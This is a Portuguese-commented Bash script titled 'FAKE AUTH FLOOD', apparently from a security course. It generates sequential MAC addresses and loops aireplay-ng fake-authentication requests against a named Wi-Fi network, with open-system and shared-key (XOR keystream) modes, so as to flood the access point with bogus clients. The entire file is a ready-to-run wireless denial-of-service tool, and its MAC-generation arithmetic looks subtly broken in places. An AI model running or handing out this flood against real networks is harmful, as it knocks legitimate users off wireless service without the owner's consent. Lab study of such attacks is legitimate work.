#!/bin/bash

function screen {
	echo "###########################################"
	echo "#                                         #"
	echo "#            FAKE AUTH FLOOD              #"
	echo "#                  v1.0                   #"
	echo "#                                         #"
	echo "# MX Cursos -> mxcursos.com/victor-andre  #"
	echo "#                                         #"
	echo "# Autor: Victor Andre                     #"
	echo "# Email: victorandreoliveira@gmail.com    #"
	echo "###########################################"
	echo
}

function ajuda {
	SCRIPT=${0##*/}
	echo -e "Uso: ./$SCRIPT <comando> ...\n"
	echo -e "Onde:" 
	echo -e "  <comando>\t#args#\t\t\t\t#descricao#\n"
	echo -e "  generate\t<num>\t\t\t\tescreve no stdout <num> MACs\n"
	echo -e "  fakeauth_opn\t<num> <nome_rede>\t\trealiza <num> falsas autenticacoes na rede <nome_rede>\n"
	echo -e "  fakeauth_ska\t<num> <nome_rede> <arq.xor>\trealiza <num> falsas autenticacoes na rede <nome_rede> usando keystream do arquivo <arq.xor>\n"
}

function ajuda_2 {
	echo "Nao encontrei interface em modo monitor :("
	echo -e "Ja tentou\n# iw dev wlan0 interface add mon0 type monitor"
	echo -e "ou\n# airmon-ng wlan0 start"
	exit 2
}

function decToHex {
	case $1 in
	10) echo "A" ;;
	11) echo "B" ;;
	12) echo "C" ;;
	13) echo "D" ;;
	14) echo "E" ;;
	15) echo "F" ;;
	*) echo $1 ;;
	esac
}

function generateMAC {
	v0=`decToHex $(echo "$1 / 16 ^ 11" | bc)`
	resto=`decToHex $(echo "$1 % 16 ^ 11" | bc)`
	v1=`decToHex $(echo "$resto / 16 ^ 10" | bc)`
	resto=`decToHex $(echo "$resto % 16 ^ 10" | bc)`
	v2=`decToHex $(echo "$resto / 16 ^ 9" | bc)`
	resto=`decToHex $(echo "$resto % 16 ^ 9" | bc)`
	v3=`decToHex $(echo "$resto / 16 ^ 8" | bc)`
	resto=`decToHex $(echo "$resto % 16 ^ 8" | bc)`
	v4=`decToHex $(echo "$resto / 16 ^ 7" | bc)`
	resto=`decToHex $(echo "$resto % 16 ^ 7" | bc)`
	v5=`decToHex $(echo "$resto / 16 ^ 6" | bc)`
	resto=`decToHex $(echo "$resto % 16 ^ 6" | bc)`
	v6=`decToHex $(echo "$resto / 16 ^ 5" | bc)`
	resto=`decToHex $(echo "$resto % 16 ^ 5" | bc)`
	v7=`decToHex $(echo "$resto / 16 ^ 5" | bc)`
	resto=`decToHex $(echo "$resto % 16 ^ 4" | bc)`
	v8=`decToHex $(echo "$resto / 16 ^ 3" | bc)`
	resto=`decToHex $(echo "$resto % 16 ^ 3" | bc)`
	v9=`decToHex $(echo "$resto / 16 ^ 2" | bc)`
	resto=`decToHex $(echo "$resto % 16 ^ 2" | bc)`
	v10=`decToHex $(echo "$resto / 16 ^ 1" | bc)`
	v11=`decToHex $(echo "$resto % 16 ^ 1" | bc)`
	echo "$v0$v1:$v2$v3:$v4$v5:$v6$v7:$v8$v9:$v10$v11"
}

function get_mon {
	iw dev | grep monitor -B 4 | grep -i interface | tr -d "\t" | cut -d" " -f2
	
}

function generate {
	LIMIT=$1
	for (( i=1 ; i <= LIMIT ; i++ ))
	do
		echo "`generateMAC $i`"
	done
}

function fakeauth_opn {
	screen
	LIMIT=$1
	NOME_REDE=$2
	MON_IFACE=`get_mon`
	if [ -z $MON_IFACE ] ; then 
		ajuda_2
	fi
	for (( i=1 ; i <= LIMIT ; i++ ))
	do
		NEW_MAC=`generateMAC $i`
		echo "###############################################"
		echo "# Nova autenticacao com MAC $NEW_MAC #"
		echo "###############################################"
		aireplay-ng --fakeauth 0 -e $NOME_REDE $MON_IFACE -h $NEW_MAC
	done
}

function fakeauth_ska {
	screen
	LIMIT=$1
	NOME_REDE=$2
	MON_IFACE=`get_mon`
	ARQ_XOR=$3
	if [ -z $MON_IFACE ] ; then 
		ajuda_2
	fi
	for (( i=1 ; i <= LIMIT ; i++ ))
	do
		NEW_MAC=`generateMAC $i`
		echo "###############################################"
		echo "# Nova autenticacao com MAC $NEW_MAC #"
		echo "###############################################"
		aireplay-ng --fakeauth 0 -e $NOME_REDE $MON_IFACE -h $NEW_MAC -y $ARQ_XOR
	done
}


function verifica_dependencias {
	if [ -z `which bc` ] ; then
		echo -e "Por favor, instale bc.\n# apt install bc"
		exit 3
	fi
	if [ -z `which aircrack-ng` ] ; then
		echo -e "Por favor, instale aircrack-ng"
		exit 3
	fi
	
}

######
#
# INICIO
#
######

verifica_dependencias



case $1 in
	fakeauth_opn) 	if [ $# -eq 3 ] ; then
				fakeauth_opn `echo "$2 $3"`;
			else
				screen;ajuda;exit 1;
 			fi
			;;
	fakeauth_ska) 	if [ $# -eq 4 ] ; then
				fakeauth_ska `echo "$2 $3 $4"`
			else
				screen;ajuda;exit 1;
 			fi
			;;
			
	generate) 	if [ $# -eq 2 ] ; then
				generate `echo $2`
			else
				screen;ajuda;exit 1;
 			fi
			;;
	*) screen ;ajuda; ;;
esac


######
#
# FIM
#
######

